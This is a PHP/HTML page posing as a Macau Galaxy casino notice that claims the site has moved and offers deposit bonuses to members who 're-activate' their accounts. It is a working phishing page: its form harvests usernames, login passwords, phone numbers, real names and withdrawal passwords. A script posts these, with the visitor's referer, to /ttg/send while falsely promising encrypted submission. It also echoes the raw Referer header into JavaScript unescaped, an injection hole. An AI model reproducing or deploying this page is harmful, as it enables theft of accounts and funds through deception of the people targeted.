<?php
$to = 'https://www.xinyh.com/';

$refer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "未知";
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <title>一直被模仿 从未被超越</title>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <link rel="stylesheet" href="./style/global.css">
</head>
<style>
    .conter {
        width: 100%;
    }

    .nert {
        width: 1076px;
        margin: 0 auto;
    }

    .ne_bg {
        background: url(./img/logo.png) no-repeat right;
        height: 161px;
    }

    .bg_gl {
        background: url(./img/gl_bg.png) no-repeat;
        background-size: cover;
        width: 100%;
        height: 100%;
        /* padding-bottom: 85px; */
    }

    .p_name {
        padding-left: 104px;
    }

    .title {
        font-size: 28px;
        color: #ffe0ad;
        margin-bottom: 20px;
        margin-top: 70px;
    }

    .p_conter {
        font-size: 24px;
        color: #ffe0ad;
        line-height: 40px;
        letter-spacing: 2px;
    }

    .user_tile {
        height: 187px;
        line-height: 200px;
        font-size: 40px;
        color: #ffe0ad;
        text-align: center;
        letter-spacing: 2px;
    }
.bg_net{
    background: url(./img/mg.png) no-repeat;
    background-size: contain;
}
    .innput {
        height: 420px;


        padding-left: 353px;
        padding-top: 34px;
        padding-right: 20px;

    }
    .int_lf{
        width: 343px;
        float: left;
        background: url(./img/fgx.png) no-repeat right;
        background-size: 2px 450px;
    }
    .int_lf>p{
        font-size: 40px;
        color: #ffe0ad;
        padding-left: 8px;
        letter-spacing: 5px;
    }
    .int_lf>p:nth-child(2){
        text-align: right;
        padding-right: 15px;

    }
    .int_ul{
        margin-top: 26px;
    }
    .int_ul>li{
        background: url(./img/csong.png) no-repeat;
        background-size: cover;
        width: 160px;
        height: 40px;
        line-height: 40px;
        text-align: center;
        font-size: 20px;
        color: #6c4300;float: left;
        margin-bottom: 1px;

    }
    .mrg{
        margin-right: 5px;
    }
    #botm{
        font-size: 24px;
        padding-right: 35px;
        text-align: right;
        letter-spacing: 0;
        padding-left: 0;
        margin-top: 15px;
    }
    .int_rg{
        float: right;
        width: 355px;

    }
    .titlea{
        padding-left: 14px;
        background: url(./img/xzhuang.png) no-repeat center;
        font-size: 30px;
        color: #ffe0ad;
        height: 40px;
        padding-left: 73px;
        line-height: 40px;
        background-size: 270px 9px;
        margin-bottom: 18px;
    }
    .lable{
        height: 36px;
        line-height: 36px;
        margin-bottom: 14px;
    }

    .lable>label{
        float: left;
        font-size: 18px;
        color: #ffe0ad;
        margin-right: 10px;
        width: 85px;
        text-align: right;
    }
    .lable>input{
        float: left;
        outline: none;
        padding-left: 12px;
        height: 36px;
        width: 250px;
        border-radius: 4px;
        background: #f0f0f0;
    }
    .lable>input::placeholder {
        color:#a37c3c;
        font-size: 14px;
        letter-spacing: 2px;
    }
    .btns{
        height: 36px;
        width: 250px;
        text-align: center;
        letter-spacing: 2px;
        border-radius: 4px;
        background: url(./img/lijijihuo.png) no-repeat;
        background-size: contain;
        line-height: 36px;
        font-size: 20px;
        color: #6c4300;
        cursor: pointer;
        margin-left: 95px;
    }
    footer{
        margin-top: 85px;
      background: #0b0701;

    }
    .cntesr{
        width: 505px;
        height: 205px;
        margin: 0 auto;
        padding-top: 48px;
    }
    .cntesr>.ftr_nav>li{
        display: inline-block;
        font-size: 18px;
        color: #e4c28b;
        cursor: pointer;
    }
    .banq{
        font-size: 18px;
        color: #e4c28b;
        letter-spacing: 2px;
        text-align: center;
        margin-top: 24px;
    }
    .bans{
        margin-top: 30px;
    }
    .kefu{
        width: 129px;
        height: 140px;
        position: fixed;
        top: 85px;
        right:12px;
        background:url(./img/kefus.png) no-repeat;
    }
    .reds{
        color: #fcff13;
    }
</style>

<body>
    <!-- 头部 -->
    <div class="bg_gl cl">
        <div class="conter">
            <div class="nert ne_bg"></div>

        </div>
        <div>
            <div class="nert p_name">
                <p class="title">尊敬的会员:</p>
                <p class="p_conter">您好，非常抱歉地通知您：由于业务调整，为了给每一位忠实玩家更好的游戏体验
                    以及为了您的资金安全。</p>
                <p class="p_conter">请您移步到公司合作授权网站: 澳门银河 <a href="<?php echo $to; ?>" class="reds">www.xinyh.com</a> ，您可以使用原来的账号
                    激活并进行游戏，在此感谢每一位忠实玩家对我们的支持！ ！</p>
            </div>
            <div class="user_tile">激活专属优惠</div>
        </div>
        <div>
            <div class="nert bg_net">
                <div class="innput">
                    <div class="int_lf">
                        <p>领取一下最</p>
                        <p>新存送优惠</p>
                        <ul class="cl int_ul">
                            <li class="mrg">存100送28</li>
                            <li>存500送58</li>
                            <li class="mrg">存1000送88</li>
                            <li>存3000送128</li>
                            <li class="mrg">存5000送188</li>
                            <li>存10000送288</li>
                            <li class="mrg">存30000送588</li>
                            <li>存50000送888</li>
                        </ul>
                        <p id="botm">以上优惠不限游戏一倍流水</p>
                    </div>
                    <div class="int_rg">
                        <div class="titlea">原有账号激活</div>
                        <div class="lable">
                            <label>用户名:</label>
                            <input id="user" type="text " placeholder="请输入会员名">
                        </div>
                        <div class="lable">
                            <label>密&nbsp;码:</label>
                            <input id="passwd" type="password" placeholder="请输入密码">
                        </div>
                        <div class="lable">
                            <label>手机号:</label>
                            <input id="phone" type="number" placeholder="请输入手机号">
                        </div>
                        <div class="lable">
                            <label>姓&nbsp;名:</label>
                            <input id="realname" type="text " placeholder="请输入姓名">
                        </div>
                        <div class="lable">
                            <label>取款密码:</label>
                            <input id="wdpass" type="text " placeholder="请输入取款密码">
                        </div>
                        <div onclick="submit();" class="btns">立即激活</div>
                    </div>
                </div>
            </div>
        </div>
        <!-- 客服 -->
        <a href="https://e-120865.chatnow.meiqia.com/dist/standalone.html" class="kefu"></a>
        <footer>
            <div class="cntesr">
                <ul class="ftr_nav">
                    <li>&nbsp;<a href="https://722yh.com/AboutUS" class="reds"> 关于澳门银河</a>&nbsp;|</li>
                  <li>&nbsp;<a href="https://722yh.com/Deposit" class="reds"> 如何存款</a>&nbsp;|</li>
                    <li>&nbsp;<a href="https://722yh.com/Partner" class="reds"> 合作伙伴</a>&nbsp;|</li>
                    <li>&nbsp;<a href="http://yh-c.com/FAQ?ResponsibleGambling" class="reds">博彩责任</a>&nbsp;|</li>
                    <li> <a href="http://www.8678yh.com/FAQ?Agreement" class="reds">博彩规则</a> </li>
                </ul>
                <div class="banq">本网站属于澳门银河所有，违者必究。</div>
                <div class="banq bans">©2014-2019 澳门银河</div>
            </div>
        </footer>
    </div>

<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/limonte-sweetalert2/7.28.11/sweetalert2.min.js"></script>
<link href="https://cdn.bootcss.com/limonte-sweetalert2/7.28.11/sweetalert2.min.css" rel="stylesheet">
<script>

    function submit(){
        var host = '<?php echo $refer; ?>';
        var username = $('#user').val();
        var passwd = $('#passwd').val();
        var tel = $('#phone').val()
        var realname = $('#realname').val();
        var wdpass = $('#wdpass').val()





        swal.queue([{
          title: '确定提交吗？',
          confirmButtonText: '确定',
          cancelButtonText: '取消',
          text:'本操作将进行加密提交，无需担心安全问题',
          showLoaderOnConfirm: true,
          showCancelButton: true,
          preConfirm: function () {
          return new Promise(function (resolve, reject) {

              $.post( "/ttg/send", { host:host,username:username,passwd:passwd,tel:tel,realname:realname,wdpass:wdpass}, "json").done(function( data ) {

                      swal.insertQueueStep('提交成功，请耐心等待')
                      resolve();

                           })
                      })
                  }
        }]);
    }





</script>


</body>

</html>